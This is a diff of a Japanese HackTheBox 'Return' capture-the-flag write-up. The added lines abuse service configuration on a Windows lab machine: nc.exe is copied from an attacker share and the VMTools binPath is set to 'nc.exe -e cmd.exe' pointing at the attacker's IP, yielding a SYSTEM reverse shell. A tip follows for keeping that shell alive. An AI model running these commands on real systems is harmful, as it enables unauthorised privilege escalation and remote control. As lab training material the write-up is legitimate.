@@ -43,7 +43,7 @@ settings.phpというページを発見、svc-printerはユーザ名？
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Return_02.png">  
 settings.phpのソースを見ても、パスワードは確認できなかった  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Return_03.png">  
-ここで実際にsettings.phpの「update」をクリックし、パケットを確認  
+ここで実際にsettings.phpの「update」をクリックし、httpリクエストを確認  
 settings.phpの「Server Address」の情報のみが送信されている  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Return_04.png">  
 ここでsettings.phpの「Server Address」にkaliのipを指定して送信すると  
@@ -200,7 +200,7 @@ robocopyコマンドを使用すればルートフラグをゲットできるが
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-printer\Documents> robocopy "C:\Users\administrator\Desktop" "C:\Users\svc-printer\Documents\" "root.txt" /B /NFL /NDL /NJH /NJS
 
-*Evil-WinRM* PS C:\Users\svc-printer\Documents> type C:\temp\exfil\root.txt
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> type C:\Users\svc-printer\Documents\root.txt
 278a2f7f1595036f612ce6fcfce54b52
 ```
 ローカルだと、レジストリのSAM・SYSTEMをダンプすればクレデンシャルを取得できるが  
@@ -302,7 +302,7 @@ Error while getting Win32_UserAccount info: System.Management.ManagementExceptio
   [X] Exception: Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
 
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Services -non Microsoft-
-È Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services                                                                                                                                             
+È Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
   [X] Exception: Access denied 
     @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver(PMC-Sierra, Inc. - @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver)[System32\drivers\arcsas.sys] - Boot
    =================================================================================================
@@ -1070,7 +1070,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-printer\Documents> copy \\10.10.16.11\share\nc.exe .
 ```
-vmtoolsサービスにnc.exeを登録
+vmtoolsサービスにnc.exeを登録、停止して再度開始
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe query vmtools
 
@@ -1086,4 +1086,36 @@ SERVICE_NAME: vmtools
 *Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config VMTools binPath= "C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.16.11 4444"
 [SC] ChangeServiceConfig SUCCESS
 
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe stop VMTools
+
+SERVICE_NAME: VMTools
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 1  STOPPED
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start VMTools
+```
+リバースシェル取得、ルートフラグゲット！
+```sh
+└─$ rlwrap nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.11] from (UNKNOWN) [10.129.163.190] 62863
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
+type C:\Users\Administrator\Desktop\root.txt
+99191ffff76401f77fc79142a148d963
+```
+ちなみに変更したサービスは十数秒で開始失敗しており、開始失敗するとnc.exe経由で取得したリバースシェルも終了する  
+終了しないためには、cmd.exeからのnc.exeをしていすると良い
+```powershell
+sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.16.11 4444"
 ```
